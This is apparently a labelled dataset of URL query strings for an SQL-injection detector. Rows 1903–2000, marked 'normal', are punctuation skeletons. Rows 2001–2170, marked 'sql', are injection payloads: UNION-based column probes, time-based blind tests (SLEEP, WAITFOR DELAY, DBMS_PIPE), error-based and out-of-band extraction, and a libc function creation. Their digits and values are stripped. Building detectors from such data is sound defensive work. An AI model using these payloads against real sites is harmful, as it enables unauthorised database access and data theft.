1903,normal,". . . . "
1904,normal,". . . . / / / / ? = "
1905,normal,". . . / ? = & = "
1906,normal,". . / / ? = & = & = "
1907,normal,". . / / / / ? = & = "
1908,normal,". . / ? = & = & = "
1909,normal,". . . / / ? = "
1910,normal,". . / / ? = "
1911,normal,". . . "
1912,normal,". . . . / / / ? = & = & = "
1913,normal,". . . . / / / ? = "
1914,normal,". . . . / / "
1915,normal,". . . / / / / ? = "
1916,normal,". . / / / / ? = & = & = "
1917,normal,". . . . / / / / ? = & = "
1918,normal,". . . / / / / ? = & = "
1919,normal,". . / / ? = & = "
1920,normal,". . . . / / ? = & = & = "
1921,normal,". . / / / ? = & = & = "
1922,normal,". . / / / ? = & = & = "
1923,normal,". . . . / / ? = & = "
1924,normal,". . / / ? = "
1925,normal,". . "
1926,normal,". . / / / / ? = "
1927,normal,". . . / / / "
1928,normal,". . . / ? = "
1929,normal,". . . / / / / ? = & = "
1930,normal,". . / / / "
1931,normal,". . . . ? = & = "
1932,normal,". . . / ? = & = "
1933,normal,". . . . / / ? = "
1934,normal,". . . . ? = & = & = "
1935,normal,". . . / "
1936,normal,". . . / / ? = "
1937,normal,". . . . "
1938,normal,". . . / ? = & = "
1939,normal,". . . . / / ? = & = & = "
1940,normal,". . / "
1941,normal,". . . / / ? = & = & = "
1942,normal,". . . . / / / / ? = "
1943,normal,". . / ? = "
1944,normal,". . . . / / / ? = & = "
1945,normal,". . . . / ? = & = & = "
1946,normal,". . . / / ? = & = "
1947,normal,". . "
1948,normal,". . . . / "
1949,normal,". . / ? = & = "
1950,normal,". . . . / / / / ? = "
1951,normal,". . . . / / ? = & = & = "
1952,normal,". . / / / "
1953,normal,". . . . / ? = & = "
1954,normal,". . . ? = & = & = "
1955,normal,". . . . / / / / ? = & = "
1956,normal,". . . . / ? = "
1957,normal,". . . / / / ? = "
1958,normal,". . "
1959,normal,". . . . / / / / ? = "
1960,normal,". . . ? = "
1961,normal,". . "
1962,normal,". . . "
1963,normal,". . / / / / ? = & = & = "
1964,normal,". . . . / ? = & = "
1965,normal,". . . . / ? = & = & = "
1966,normal,". . . / "
1967,normal,". . / / / / ? = & = "
1968,normal,". . . / / ? = & = & = "
1969,normal,". . . / / ? = & = "
1970,normal,". . / / / "
1971,normal,". . . . / / / ? = & = "
1972,normal,". . . / / / ? = & = "
1973,normal,". . . "
1974,normal,". . . . ? = "
1975,normal,". . . ? = & = "
1976,normal,". . / ? = & = "
1977,normal,". . / / ? = "
1978,normal,". . . / / ? = & = "
1979,normal,". . / / / / ? = & = & = "
1980,normal,". . . ? = & = & = "
1981,normal,". . / "
1982,normal,". . . / ? = "
1983,normal,". . . . / "
1984,normal,". . . "
1985,normal,". . "
1986,normal,". . . "
1987,normal,". . . / / / ? = & = "
1988,normal,". . . / / ? = & = & = "
1989,normal,". . / / / ? = "
1990,normal,". . / / / "
1991,normal,". . . / / / / ? = "
1992,normal,". . . . / / / ? = & = "
1993,normal,". . / / / / ? = "
1994,normal,". . . / / ? = & = "
1995,normal,". . . ? = & = "
1996,normal,". . / / / ? = & = & = "
1997,normal,". . . / / / / ? = & = & = "
1998,normal,". . . . / / ? = & = & = "
1999,normal,". . . / / ? = & = "
2000,normal,". . . / / / / ? = & = "
2001,sql,". . . . / / / / ? =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2002,sql,". . . / / ? =   "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2003,sql,". . / / / ? = & =  - "" ORDER BY # "
2004,sql,". . . / / / / ? = & =   ' ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2005,sql,". . / / / ? = & =   ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
2006,sql,". . . / / / ? = & = & = & =   ) AND = AND ( = "
2007,sql,". . . / / ? =   ' ) ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Bcts ) # "
2008,sql,". . / / ? = & = & = & =   UNION ALL SELECT NULL # "
2009,sql,". . . / / / / ? = & =   "" ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( " EdRc " = " "
2010,sql,". . . / / / / ? =   "" ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( " STMB " = " "
2011,sql,". . . / / / ? = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2012,sql,". . . . ? = & = & =   ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ' qgPi ' LIKE ' "
2013,sql,". . . . / / / / ? = & = & =   "" AND SLEEP ( ) # "
2014,sql,". . . . / / / ? = & =   % ' ) RLIKE SLEEP ( ) AND ( ' % ' = ' "
2015,sql,". . . . / / / ? =   "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " QpWe " = " "
2016,sql,". . / / / / ? = & =   ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' yThB ' LIKE ' "
2017,sql,". . / / / ? = & = & =   ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
2018,sql,". . . . / / / ? =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2019,sql,". . / / ? = & = & =   % ' AND =  -- "
2020,sql,". . . . / / / / ? = & = & = & =    ORDER BY  -- "
2021,sql,". . . . / / / / ? =   ) ) ) AND = AND ( ( ( = "
2022,sql,". . . . / / / / ? = & = & =   ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' uTZJ ' = ' "
2023,sql,". . . / / / ? = & =    UNION ALL SELECT NULL , NULL , NULL -- "
2024,sql,". . . / / ? = & = & =   "" ; SELECT PG_SLEEP ( )  --"
2025,sql,". . . . ? = & = & = & =   AND =  -- "
2026,sql,". . . / / / / ? = & = & = & =   ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' )  -- "
2027,sql,". . / / ? = & =  - ) UNION ALL SELECT  -- "
2028,sql,". . ? = & = & =   ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2029,sql,". . . ? = & =   "" ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2030,sql,". . ? = & =   "" ) ORDER BY  -- "
2031,sql,". . . / / / / ? =   ; SELECT SLEEP ( ) # "
2032,sql,". . . / / / ? = & =  - ORDER BY # "
2033,sql,". . . . / / ? = & = & =  - ' ) ) UNION ALL SELECT , ,  -- "
2034,sql,". . . / / / / ? =  - ' UNION ALL SELECT , , , ,  -- "
2035,sql,". . . / / / / ? = & = & =  - % ' ) UNION ALL SELECT , , , , , , , , ,  -- "
2036,sql,". . / / / ? = & =   "" ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( " luuw " = " "
2037,sql,". . . / / / / ? = & =   ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' uusG ' LIKE ' "
2038,sql,". . . ? =   "" ) ) AND =  -- "
2039,sql,". . . . / / ? = & =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ( ' Rcvj ' LIKE ' "
2040,sql,". . . / / ? = & = & = & =   ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' YayJ ' = ' "
2041,sql,". . ? =   ) ) UNION ALL SELECT NULL , NULL , NULL # "
2042,sql,". . . . / ? = & = & = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2043,sql,". . . ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
2044,sql,". . / / / / ? = & =   % ' AND = AND ' % ' = ' "
2045,sql,". . . ? = & = & =   ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' OdQr ' LIKE ' "
2046,sql,". . / / ? = & = & =   ( CASE WHEN ( = ) THEN ' ' ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
2047,sql,". . . . ? = & =   ' ) ) AND SLEEP ( ) # "
2048,sql,". . . . / / / ? = & =  - ' UNION ALL SELECT , , , , , , , , # "
2049,sql,". . . / / / / ? = & =   "" ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( " FbpA " LIKE " "
2050,sql,". . . ? = & = & =   AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
2051,sql,". . . . / ? = & = & =   % "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND " % " = " "
2052,sql,". . . / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL # "
2053,sql,". . . . ? = & =   % ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' % ' = ' "
2054,sql,". . . / / ? = & =   ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' sdPf ' LIKE ' "
2055,sql,". . . / ? = & = & =   % "" AND MAKE_SET ( = , ) AND " % " = " "
2056,sql,". . . . ? = & = & =    AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) "
2057,sql,". . . . / / / / ? = & =   ( CASE WHEN ( = ) THEN SLEEP ( ) ELSE  END ) "
2058,sql,". . ? = & = & = & =   ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' cLIE ' LIKE ' "
2059,sql,". . / / ? =  - ' ) ) UNION ALL SELECT , , , , , ,  -- "
2060,sql,". . / / ? =   ) ORDER BY # "
2061,sql,". . . / / / ? = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2062,sql,". . . / / / ? = & = & = & =   "" AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND " dhCg " LIKE " "
2063,sql,". . . . / ? = & = & = & =   ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2064,sql,". . . / ? = & = & =   ' ) UNION ALL SELECT NULL # "
2065,sql,". . / ? =  - % ' ) ORDER BY # "
2066,sql,". . . / / ? = & = & =   ' ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ' qpyK ' LIKE ' "
2067,sql,". . ? = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL # "
2068,sql,". . . / ? = & =   "" ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( " onYW " = " "
2069,sql,". . ? = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL -- "
2070,sql,". . / / / ? = & =   "" AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND " jMTM " LIKE " "
2071,sql,". . . / / / / ? = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2072,sql,". . . / ? = & = & = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' fQbn ' = ' "
2073,sql,". . . . / / / / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2074,sql,". . / ? =   % "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " % " = " "
2075,sql,". . . / / / / ? = & =   ) ) ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2076,sql,". . / / / ? =  - ) ) ORDER BY  -- "
2077,sql,". . . . / / / / ? = & =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
2078,sql,". . ? = & =  - "" ) ) UNION ALL SELECT , , , , # "
2079,sql,". . / / ? = & = & =   ' ORDER BY  -- "
2080,sql,". . . / / / ? = & =   "" ) ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) cxFv ) # "
2081,sql,". . . ? = & =   ' RLIKE SLEEP ( ) AND ' ITzu ' = ' "
2082,sql,". . / / / ? = & = & = & =   ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( ' iDnI ' = ' "
2083,sql,". . . ? = & = & = & =   ) ) ; SELECT PG_SLEEP ( )  --"
2084,sql,". . . / / / ? = & =   ' UNION ALL SELECT NULL , NULL # "
2085,sql,". . / / / / ? = & =   % ' ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( ' % ' = ' "
2086,sql,". . / / / ? =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL -- "
2087,sql,". . . . / / / ? = & =   ' ; SELECT PG_SLEEP ( )  --"
2088,sql,". . / ? = & =   ' AND SLEEP ( ) AND ' xMHL ' LIKE ' "
2089,sql,". . . . / ? = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2090,sql,". . ? = & =   ) UNION ALL SELECT NULL , NULL , NULL -- "
2091,sql,". . . / / / ? = & = & = & =   "" ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2092,sql,". . / ? = & =   ) ) AND = % "
2093,sql,". . / / / / ? =   ) AND = AND ( = "
2094,sql,". . / ? =   ' WAITFOR DELAY ' : : '  -- "
2095,sql,". . . . / / / / ? = & = & = & =  - ) UNION ALL SELECT , , , , ,  -- "
2096,sql,". . / ? =   ) ORDER BY # "
2097,sql,". . / / / ? = & = & =   ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( = "
2098,sql,". . . / / / / ? = & = & =   "" ) ; SELECT SLEEP ( ) # "
2099,sql,". . . . / ? = & =   ' ) ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( ( ' ZxlB ' = ' "
2100,sql,". . . . ? = & = & =   , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s ) "
2101,sql,". . . . / / ? = & = & =   ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' cHXg ' LIKE ' "
2102,sql,". . / / / ? = & = & = & =  - "" UNION ALL SELECT ,  -- "
2103,sql,". . . / / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2104,sql,". . / ? = & = & = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL # "
2105,sql,". . . . / / / / ? = & = & =   "" ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( " RRzo " = " "
2106,sql,". . . . / / / / ? = & = & =   ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( = "
2107,sql,". . . / ? =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2108,sql,". . / ? =   AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) # "
2109,sql,". . ? = & =   % ' UNION ALL SELECT NULL # "
2110,sql,". . . . / / / / ? = & = & = & =  - "" ORDER BY # "
2111,sql,". . . . / / ? = & =   "" ) ORDER BY  -- "
2112,sql,". . / / / ? = & = & =   % "" AND = % "
2113,sql,". . . . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL # "
2114,sql,". . . . ? = & = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2115,sql,". . . ? =   % ' ) ) AND = % "
2116,sql,". . / / ? = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2117,sql,". . / / ? = & = & =   ' ) AND = AND ( ' aIso ' = ' "
2118,sql,". . ? =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
2119,sql,". . / / ? =  - ' UNION ALL SELECT , , ,  -- "
2120,sql,". . / / / / ? = & = & =   ) ) ) UNION ALL SELECT NULL -- "
2121,sql,". . . ? = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) )  -- "
2122,sql,". . . . ? = & =   ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' OfJm ' LIKE ' "
2123,sql,". . . . ? = & = & =  - ' ORDER BY  -- "
2124,sql,". . . / / ? = & = & =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
2125,sql,". . / / / / ? = & = & = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( = "
2126,sql,". . / / ? =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2127,sql,". . . . / / ? = & = & =   "" AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " OXLt " = " "
2128,sql,". . . . / / / / ? =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( = "
2129,sql,". . . . / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2130,sql,". . . . / ? = & =  - ' ) UNION ALL SELECT , , , , , , , , # "
2131,sql,". . . . / ? = & = & = & =  - ' UNION ALL SELECT , , , # "
2132,sql,". . . / / / / ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2133,sql,". . . / / / / ? = & = & =  - "" UNION ALL SELECT ,  -- "
2134,sql,". . . . / / / ? = & = & =  - % "" UNION ALL SELECT , , , , ,  -- "
2135,sql,". . . . / ? = & =   "" ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( " Zynk " = " "
2136,sql,". . . . / / ? =   ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION euFA --"
2137,sql,". . / / / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2138,sql,". . / ? =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2139,sql,". . . . / / / ? = & = & = & =  - UNION ALL SELECT , , , , , , , , , # "
2140,sql,". . . / ? = & = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2141,sql,". . . / ? = & = & =   ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( = "
2142,sql,". . . . / / / ? = & = & =   AND = "
2143,sql,". . / / / ? = & = & = & =   ' ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) pjBf ) # "
2144,sql,". . . ? = & = & = & =  - % "" UNION ALL SELECT , , # "
2145,sql,". . / / / / ? = & =  - ' ORDER BY # "
2146,sql,". . ? = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2147,sql,". . ? = & = & = & =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " EIzt " LIKE " "
2148,sql,". . . / / / / ? = & = & = & =   ' ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ' eSLo ' = ' "
2149,sql,". . / ? = & = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2150,sql,". . . / / / / ? = & = & =   "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND " oUkp " = " "
2151,sql,". . . . ? =   ' ) AND =  -- "
2152,sql,". . . / / / ? = & = & = & =   ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
2153,sql,". . . / / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2154,sql,". . . / / / / ? = & =   % ' ) ) AND = % "
2155,sql,". . / / / ? = & = & = & =   AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) "
2156,sql,". . . / / ? = & =  - % ' ) UNION ALL SELECT , , , , , , , # "
2157,sql,". . / / / / ? =   % ' ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ' % ' = ' "
2158,sql,". . . / / / ? = & =  - ' ) ) ) UNION ALL SELECT , , , , ,  -- "
2159,sql,". . / / / ? = & =  - ) UNION ALL SELECT , , , , ,  -- "
2160,sql,". . / / ? = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
2161,sql,". . ? = & = & =  - ) ) ORDER BY # "
2162,sql,". . / / ? = & = & =  - UNION ALL SELECT , , ,  -- "
2163,sql,". . / / / / ? = & = & = & =   % "" AND ELT ( = , SLEEP ( ) ) AND " % " = " "
2164,sql,". . / ? = & = & = & =   ' ) ) AND SLEEP ( ) AND ( ( ' eWzK ' LIKE ' "
2165,sql,". . . . ? = & = & =   ' ; WAITFOR DELAY ' : : '  --"
2166,sql,". . / / / ? =   ' AND = # "
2167,sql,". . / / / ? =   "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " GFMZ " = " "
2168,sql,". . . . / ? = & =  - ) UNION ALL SELECT , , ,  -- "
2169,sql,". . / ? = & =  - ) UNION ALL SELECT , ,  -- "
2170,sql,". . / / ? = & = & = & =   % ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' % ' = ' "
